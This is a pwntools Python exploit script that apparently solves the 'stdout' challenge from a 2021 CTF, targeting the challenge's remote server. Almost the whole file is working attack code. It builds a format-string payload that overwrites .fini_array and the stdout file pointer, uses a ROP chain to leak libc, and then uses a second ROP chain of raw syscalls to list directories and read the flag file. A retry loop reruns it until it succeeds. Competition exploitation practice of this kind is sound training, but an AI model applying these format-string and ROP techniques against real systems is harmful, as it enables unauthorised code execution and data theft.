from pwn import *

def exp():
 #io = process('./stdout',aslr=False)
 io = remote('stdout.2021.3k.ctf.to', 9998)
 exe = ELF('./stdout')

 io.recvline()

 lower32 = int(io.recvline().strip(),0)
 print(f'[*] Stack lower32 = {hex(lower32)}')

 # exploit plan
 # first change stack ptr to address of printf 
 # overwrite it to get 1 more chance
 # Overwrite stdout->_fileno = 2 ( stderr is already buffered )
 # now we can leak
 # ROP ???

 bss_addr = 0x404140
 fini_array = 0x403d98
 stdout_offset_bss = 0x404110
 stderr_libc_offset = 0x1ec5c0

 stack_ptr = 45
 fake_entry_offset = 62
 fake_call_offset = (bss_addr - fini_array)
 call_ptr = 0x0401390

 overwrite_fini_array_offset = f'%{ (bss_addr+8)-fini_array}c%{fake_entry_offset}$hn'
 fake_fini_array_entry = f'%{ ((call_ptr&0xff) - ((bss_addr+8) -fini_array))&0xff }c%17$hhn'
 fake_fini_array_entry += f'%{ ((call_ptr >> 8 ) - (call_ptr&0xff))&0xff }c%18$hhn'
 fake_fini_array_entry += f'%{ ((call_ptr >> 16) - (call_ptr >> 8))&0xff}c%19$hhn'
 overwrite_stdout_ptr = f'%{ ((stderr_libc_offset&0xff) -(call_ptr >> 16) )&0xff}c%20$hhn'
 overwrite_stdout_ptr += f'%{ (0xd5 - (stderr_libc_offset&0xff) )&0xff}c%21$hhn'
 payload = overwrite_fini_array_offset+fake_fini_array_entry+overwrite_stdout_ptr
 payload = payload.ljust(0x48,'A').encode() + p64(bss_addr)+p64(bss_addr+1)+p64(bss_addr+2) +\
  p64(stdout_offset_bss) + p64(stdout_offset_bss+1)

 L_pop_rdi = 0x401443
 io.send(payload)

 L_ROP = [
  b'A'*0x90,
  L_pop_rdi, #retaddr read()
  exe.got["puts"],
  exe.sym.puts,
  call_ptr
 ]

 io.send(flat(L_ROP,arch='amd64'))

 #libc = ELF('./libc-2.31.so')
 
 libc_leak = u64(io.recvuntil("\x7f")+b'\0\0')
 libc_base = libc_leak - 0x875a0
 print(hex(libc_base))
 
 L_pop_rax = 0x000d4042
 L_pop_rsi = 0x001599e4
 L_pop_rdx_rbx = 0x00162866
 L_syscall = 0x00066229
 L_pop_rsp = 0x032b5a

 R_ROP = [
  b'A'*(0x100-0x58),
  L_pop_rdi,
  0,
  libc_base + L_pop_rsi,
  bss_addr,
  libc_base + L_pop_rax,
  0,
  libc_base + L_syscall,
  libc_base+L_pop_rsp,
  bss_addr
 ]

 ROP2 = [
  libc_base + L_pop_rax,
  0x40000000 | 0x2,
  L_pop_rdi,
  0x404230,
  libc_base + L_pop_rsi,
  0,
  libc_base + L_pop_rdx_rbx,
  0,
  0,
  libc_base + L_syscall,
  L_pop_rdi,
  1,
  libc_base + L_pop_rsi,
  0x404300,
  libc_base + L_pop_rax,
  78,
  libc_base + L_pop_rdx_rbx,
  0x500,
  0,
  libc_base + L_syscall,
  L_pop_rdi,
  2,
  libc_base + L_pop_rsi,
  0x404300,
  libc_base + L_pop_rdx_rbx,
  500,
  0,
  libc_base + L_pop_rax,
  1,
  libc_base + L_syscall
 ]
 pause()
 io.send(flat(R_ROP,arch='amd64').ljust(0x100,b'A'))

 pause()
 io.send( flat(ROP2,arch='amd64') +b".\x00") #b"ca3b8506407eb1e2edaa13f0782dd1092475a8edd4db2919ee9f94493c14ea58f20fb2b5e1914dfaae1416c24772e78e5a4fb606ef713a01e4eafc4c0c79089c.txt\x00")#/home/hk/3k/master/stdout/bin\x00")
 data = io.recvuntil(".txt")
 print(data[0xa2:])

if __name__=='__main__':
 while True:
  try:
   exp()
   break
  except:
   continue
